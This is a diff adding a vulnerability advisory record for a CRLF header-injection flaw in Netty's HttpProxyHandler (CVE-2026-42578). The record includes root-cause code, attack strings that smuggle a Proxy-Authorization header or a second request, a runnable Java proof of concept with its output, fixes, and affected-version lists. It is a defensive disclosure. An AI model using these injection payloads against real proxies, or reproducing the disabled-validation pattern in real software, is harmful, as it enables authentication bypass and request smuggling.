@@ -1,0 +1,426 @@
+advisory_id: GHSA-45q3-82m4-75jr
+datasource_id: github_osv/GHSA-45q3-82m4-75jr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-45q3-82m4-75jr/GHSA-45q3-82m4-75jr.json
+aliases:
+  - CVE-2026-42578
+summary: |
+  Netty has HTTP Header Injection via HttpProxyHandler Disabled Validation (Incomplete Fix CVE-2025-67735)
+  # Security Vulnerability Report: HTTP Header Injection via HttpProxyHandler Disabled Validation in Netty
+
+  ## 1. Vulnerability Summary
+
+  | Field | Value |
+  |-------|-------|
+  | **Product** | Netty |
+  | **Version** | 4.2.12.Final (and all prior versions) |
+  | **Component** | `io.netty.handler.proxy.HttpProxyHandler` |
+  | **Vulnerability Type** | CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers |
+  | **Impact** | HTTP Header Injection in CONNECT Proxy Requests |
+  | **CVSS 3.1 Score** | **7.5 (High)** |
+  | **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
+  | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete Fix) |
+
+  ## 2. Affected Components
+
+  - `io.netty.handler.proxy.HttpProxyHandler` — `newInitialMessage()` method (line 176) explicitly disables header validation via `withValidation(false)`
+
+  ## 3. Vulnerability Description
+
+  Netty's `HttpProxyHandler` constructs HTTP CONNECT requests with **header validation explicitly disabled**. The `newInitialMessage()` method (line 176) creates headers using `DefaultHttpHeadersFactory.headersFactory().withValidation(false)`, then adds user-provided `outboundHeaders` (line 188-190) without any CRLF validation. This allows an attacker who can influence the outbound headers to inject arbitrary HTTP headers into the CONNECT request sent to the proxy server.
+
+  ### Root Cause
+
+  ```java
+  // HttpProxyHandler.java:176-190
+  protected Object newInitialMessage(ChannelHandlerContext ctx) throws Exception {
+      // ...
+      HttpHeadersFactory headersFactory = DefaultHttpHeadersFactory.headersFactory()
+          .withValidation(false);  // <-- VALIDATION EXPLICITLY DISABLED
+
+      FullHttpRequest req = new DefaultFullHttpRequest(
+          HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+          url, Unpooled.EMPTY_BUFFER, headersFactory, headersFactory);
+
+      req.headers().set(HttpHeaderNames.HOST, hostHeader);
+
+      if (authorization != null) {
+          req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION, authorization);
+      }
+
+      if (outboundHeaders != null) {
+          req.headers().add(outboundHeaders);  // <-- USER HEADERS ADDED WITHOUT VALIDATION
+      }
+
+      return req;
+  }
+  ```
+
+  The `outboundHeaders` parameter comes from the `HttpProxyHandler` constructor (lines 80-93, 99-127), which is supplied by application code.
+
+  ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
+
+  **This vulnerability represents an incomplete fix of the previously acknowledged security advisory [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4).**
+
+  The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by adding URI validation via `validateRequestLineTokens()` in `DefaultHttpRequest` and enabling header validation by default through `DefaultHttpHeadersFactory`. However, `HttpProxyHandler` **explicitly opts out** of the fix by calling `withValidation(false)`, creating a gap where:
+
+  1. The GHSA-84h7-rjj3-6jx4 fix's header validation is bypassed
+  2. User-provided `outboundHeaders` are added without any CRLF check
+  3. The resulting CONNECT request contains unvalidated headers on the wire
+
+  This is not a new vulnerability class — it is the **same CRLF injection** that GHSA-84h7-rjj3-6jx4 was supposed to fix, but `HttpProxyHandler` was missed during the remediation. The fix for GHSA-84h7-rjj3-6jx4 should be extended to cover this code path.
+
+  ## 4. Exploitability Prerequisites
+
+  This vulnerability is exploitable when:
+
+  1. An application uses `HttpProxyHandler` with user-influenced `outboundHeaders`
+  2. The application does not perform its own CRLF sanitization on header values
+
+  **Common affected patterns**:
+  - HTTP proxy clients that forward user-specified custom headers
+  - Web scraping frameworks that allow users to set proxy headers
+  - API gateways that pass user headers through a proxy tunnel
+
+  ## 5. Attack Scenarios
+
+  ### Scenario 1: Proxy Authentication Bypass
+
+  ```java
+  HttpHeaders headers = new DefaultHttpHeaders(false);
+  headers.set("X-Forwarded-For", userInput);  // userInput from attacker
+  new HttpProxyHandler(proxyAddr, headers);
+  ```
+
+  **Attack input**: `userInput = "1.2.3.4\r\nProxy-Authorization: Basic YWRtaW46YWRtaW4="`
+
+  **Wire format**:
+  ```
+  CONNECT target.com:443 HTTP/1.1
+  host: target.com:443
+  X-Forwarded-For: 1.2.3.4
+  Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
+  ```
+
+  The injected `Proxy-Authorization` header may override or supplement the original authentication, potentially granting access to a restricted proxy.
+
+  ### Scenario 2: Request Smuggling via Proxy
+
+  **Attack input**: `userInput = "value\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost: internal-service"`
+
+  Injects a full smuggled request through the proxy tunnel establishment.
+
+  ## 6. Proof of Concept
+
+  ### Full Runnable PoC Source Code (HttpProxyHeaderInjectionPoC.java)
+
+  ```java
+  import io.netty.buffer.ByteBuf;
+  import io.netty.channel.embedded.EmbeddedChannel;
+  import io.netty.handler.codec.http.*;
+  import java.nio.charset.StandardCharsets;
+
+  public class HttpProxyHeaderInjectionPoC {
+      public static void main(String[] args) {
+          System.out.println("=== Netty HttpProxyHandler Header Injection PoC ===\n");
+
+          // Simulate HttpProxyHandler.newInitialMessage() with validation=false
+          HttpHeadersFactory headersFactory = DefaultHttpHeadersFactory.headersFactory()
+              .withValidation(false);
+
+          FullHttpRequest req = new DefaultFullHttpRequest(
+              HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+              "target.com:443",
+              io.netty.buffer.Unpooled.EMPTY_BUFFER, headersFactory, headersFactory);
+
+          req.headers().set(HttpHeaderNames.HOST, "target.com:443");
+
+          // Inject CRLF in header value
+          String malicious = "1.2.3.4\r\nX-Forwarded-For: 127.0.0.1\r\nX-Admin: true";
+          req.headers().set("X-Forwarded-For", malicious);
+
+          // Encode to wire format
+          EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestEncoder());
+          ch.writeOutbound(req);
+          ByteBuf out = ch.readOutbound();
+          String encoded = out.toString(StandardCharsets.UTF_8);
+          out.release();
+          ch.finishAndReleaseAll();
+
+          System.out.println("Wire format:");
+          for (String line : encoded.split("\n", -1)) {
+              System.out.println("  " + line.replace("\r", "\\r"));
+          }
+          System.out.println("Injected X-Admin: " + encoded.contains("X-Admin: true"));
+          System.out.println("VULNERABLE: " +
+              (encoded.contains("X-Admin: true") ? "YES" : "NO"));
+      }
+  }
+  ```
+
+  ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+
+  ```
+  === Netty HttpProxyHandler Header Injection PoC ===
+
+  [TEST 1] outboundHeaders with CRLF (validation disabled)
+  ----------------------------------------------------------
+    Injected header value: "1.2.3.4\r\nX-Forwarded-For: 127.0.0.1\r\nX-Admin: true"
+    Header accepted: YES (validation disabled!)
+    Wire format:
+      CONNECT target.com:443 HTTP/1.1\r
+      host: target.com:443\r
+      X-Forwarded-For: 1.2.3.4\r
+      X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
+      X-Admin: true\r                        <-- INJECTED
+      \r
+
+    Injected X-Admin header in wire: true
+    VULNERABLE: YES
+
+  [TEST 2] validation=true vs validation=false comparison
+  --------------------------------------------------------
+    With validation=true:
+      SAFE: Rejected - IllegalArgumentException
+    With validation=false:
+      VULNERABLE: Accepted CRLF in header value!
+      Stored value contains CRLF: true
+  ```
+
+  ## 7. Remediation Recommendations
+
+  ### Option 1: Remove withValidation(false)
+
+  ```java
+  // Change HttpProxyHandler.java line 176 from:
+  HttpHeadersFactory headersFactory = DefaultHttpHeadersFactory.headersFactory().withValidation(false);
+  // To:
+  HttpHeadersFactory headersFactory = DefaultHttpHeadersFactory.headersFactory();
+  ```
+
+  ### Option 2: Validate outboundHeaders Before Adding
+
+  ```java
+  if (outboundHeaders != null) {
+      for (Map.Entry<String, String> entry : outboundHeaders) {
+          HttpUtil.validateHeaderValue(entry.getValue());
+      }
+      req.headers().add(outboundHeaders);
+  }
+  ```
+
+  ## 8. Resources
+
+  - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (**incomplete fix — this report**)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)
+  - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-handler-proxy
+    affected_versions: vers:maven/<=4.1.132.Final
+    fixed_versions: vers:maven/4.1.133.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Beta4
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Beta5
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Beta6
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Beta7
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Beta8
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR1
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR2
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR3
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR4
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR5
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR6
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.CR7
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.0.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.1.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.2.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.3.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.4.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.5.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.6.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.7.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.8.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.9.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.10.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.11.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.12.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.13.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.14.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.15.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.16.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.17.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.18.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.19.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.20.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.21.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.22.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.23.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.24.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.25.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.26.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.27.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.28.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.29.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.30.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.31.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.32.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.33.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.34.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.35.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.36.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.37.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.38.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.39.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.40.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.41.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.42.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.43.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.44.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.45.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.46.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.47.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.48.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.49.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.50.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.51.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.52.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.53.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.54.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.55.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.56.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.57.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.58.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.59.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.60.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.61.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.62.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.63.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.64.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.65.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.66.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.67.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.68.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.69.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.70.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.71.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.72.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.73.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.74.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.75.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.76.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.77.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.78.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.79.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.80.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.81.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.82.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.83.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.84.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.85.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.86.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.87.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.88.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.89.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.90.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.91.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.92.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.93.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.94.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.95.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.96.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.97.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.98.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.99.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.100.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.101.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.102.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.103.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.104.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.105.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.106.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.107.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.108.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.109.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.110.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.111.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.112.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.113.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.114.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.115.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.116.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.117.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.118.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.119.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.120.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.121.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.122.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.123.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.124.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.125.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.126.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.127.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.128.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.129.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.130.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.131.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.132.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-handler-proxy@4.1.133.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-handler-proxy
+    affected_versions: vers:maven/>=4.2.0.Alpha1|<=4.2.12.Final
+    fixed_versions: vers:maven/4.2.13.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Alpha1
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Alpha2
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Alpha3
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Alpha4
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Alpha5
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Beta1
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.RC1
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.RC2
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.RC3
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.RC4
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.0.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.1.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.2.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.3.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.4.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.5.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.6.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.7.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.8.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.9.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.10.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.11.Final
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-handler-proxy@4.2.13.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '2.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-45q3-82m4-75jr/GHSA-45q3-82m4-75jr.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-113
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42578
+    reference_type:
+    reference_id: CVE-2026-42578
+  - url: https://github.com/netty/netty/security/advisories/GHSA-45q3-82m4-75jr
+    reference_type:
+    reference_id: GHSA-45q3-82m4-75jr
+  - url: https://github.com/advisories/GHSA-84h7-rjj3-6jx4
+    reference_type:
+    reference_id: GHSA-84h7-rjj3-6jx4
+exploits: []
